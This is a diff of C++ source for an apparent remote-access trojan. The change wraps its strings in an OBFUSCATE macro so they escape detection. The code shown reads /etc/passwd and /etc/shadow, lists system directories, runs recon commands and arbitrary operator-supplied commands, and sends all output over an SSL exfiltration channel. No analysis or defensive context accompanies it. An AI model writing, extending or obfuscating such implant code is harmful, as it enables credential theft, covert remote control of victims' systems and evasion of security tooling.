@@ -81,28 +81,28 @@ static std::string exec_command(const std::string& cmd) {
 // ----------------------------------------------------------------------
 static std::string collect_sensitive_files() {
     std::ostringstream out;
-    out << "\n=== SENSITIVE FILES ===\n";
+    out << OBFUSCATE("\n=== SENSITIVE FILES ===\n").decrypt();
 
     // Read /etc/passwd
-    std::ifstream passwd("/etc/passwd");
+    std::ifstream passwd(OBFUSCATE("/etc/passwd").decrypt().c_str());
     if (passwd.is_open()) {
-        out << "\n--- /etc/passwd ---\n";
+        out << OBFUSCATE("\n--- /etc/passwd ---\n").decrypt();
         out << passwd.rdbuf();
     } else {
-        out << "[!] Could not read /etc/passwd\n";
+        out << OBFUSCATE("[!] Could not read /etc/passwd\n").decrypt();
     }
 
     // Read /etc/shadow (may fail if not root)
-    std::ifstream shadow("/etc/shadow");
+    std::ifstream shadow(OBFUSCATE("/etc/shadow").decrypt().c_str());
     if (shadow.is_open()) {
-        out << "\n--- /etc/shadow ---\n";
+        out << OBFUSCATE("\n--- /etc/shadow ---\n").decrypt();
         out << shadow.rdbuf();
     } else {
-        out << "[!] Could not read /etc/shadow (requires root)\n";
+        out << OBFUSCATE("[!] Could not read /etc/shadow (requires root)\n").decrypt();
     }
 
     // Basic directory listings
-    out << "\n=== DIRECTORY LISTINGS ===\n";
+    out << OBFUSCATE("\n=== DIRECTORY LISTINGS ===\n").decrypt();
     const char* dirs[] = {"/", "/etc", "/var", "/tmp", "/home", nullptr};
     for (int i = 0; dirs[i]; ++i) {
         out << "\n--- " << dirs[i] << " ---\n";
@@ -197,26 +197,26 @@ static std::string handle_message(const std::string& msg, SSL* exfil_ssl) {
     if (type == "HELO") {
         response = "HI " + id;
         // Send initial recon on HELO
-        std::string recon = exec_command("uname -a; id; hostname");
-        exfiltrate(exfil_ssl, "=== INITIAL RECON ===\n" + recon + "\n=== END RECON ===\n");
+        std::string recon = exec_command(OBFUSCATE("uname -a; id; hostname").decrypt());
+        exfiltrate(exfil_ssl, OBFUSCATE("=== INITIAL RECON ===\n").decrypt() + recon + OBFUSCATE("\n=== END RECON ===\n").decrypt());
     }
     else if (type == "CMD") {
         std::string output = exec_command(data);
         response = "OK " + id + " " + output;
-        exfiltrate(exfil_ssl, "CMD: " + data + "\n" + output + "\n---\n");
+        exfiltrate(exfil_ssl, OBFUSCATE("CMD: ").decrypt() + data + "\n" + output + "\n---\n");
     }
     else if (type == "RECON") {
         // Run full reconnaissance and send back
         std::string recon_report = run_full_recon();
         response = "OK " + id + " " + recon_report;
-        exfiltrate(exfil_ssl, "=== FULL RECON REPORT ===\n" + recon_report + "\n=== END ===\n");
+        exfiltrate(exfil_ssl, OBFUSCATE("=== FULL RECON REPORT ===\n").decrypt() + recon_report + OBFUSCATE("\n=== END ===\n").decrypt());
     }
     else if (type == "EXIT") {
-        response = "OK " + id + " exiting";
+        response = "OK " + id + OBFUSCATE(" exiting").decrypt();
         throw std::runtime_error("EXIT");
     }
     else {
-        response = "ERR " + id + " unknown command";
+        response = "ERR " + id + OBFUSCATE(" unknown command").decrypt();
     }
 
     return response;
